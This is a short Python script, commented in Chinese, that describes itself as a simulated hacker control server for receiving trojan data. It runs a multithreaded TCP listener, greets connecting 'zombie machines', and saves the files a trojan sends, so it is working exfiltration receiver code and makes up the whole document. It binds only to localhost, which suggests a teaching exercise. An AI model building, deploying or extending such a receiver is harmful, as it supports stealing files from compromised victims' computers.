# 模拟黑客接收木马数据的控制端 无人值守 多线程
import socket
import threading
import struct

def socket_server():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # 端口释放
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    # 绑定ip和端口(服务器)
    server.bind(('127.0.0.1',22222))
    server.listen(10)  # 单线程可以连接11个服务
    print("Waiting")
    while True:
        #print("接收数据包...")
        client,clientaddr = server.accept()
        t = threading.Thread(target=client_deal_data,args=(client,clientaddr))
        t.start()

def client_deal_data(client,clientaddr):
    print(f"有肉机上线 {clientaddr}")
    # 数据接收
    while True:
        filebasepack = struct.calcsize('128sl')
        filebaseinfo = client.recv(filebasepack)

        if filebaseinfo:
            print(filebaseinfo)
            filebasename,filebasesize = struct.unpack('128sl',filebaseinfo)
            # 解码数据
            filename = filebasename.strip(str.encode('\00'))
            print(f"木马请求发送文件{filename},大小为{filebasesize}")
            recv_file_size = 0
            tmp_file = open(filename,'wb')
            while not recv_file_size == filebasesize:
                if filebasesize-recv_file_size >= 1024:
                    recvdata = client.recv(1024)
                    recv_file_size+=len(recvdata)

                else:
                    recvdata = client.recv(filebasesize-recv_file_size)
                    recv_file_size=filebasesize
                tmp_file.write(recvdata)
            tmp_file.close()
            print(f'文件接收完成,本地文件为{filename}')
        #break

if __name__ == '__main__':
    socket_server()
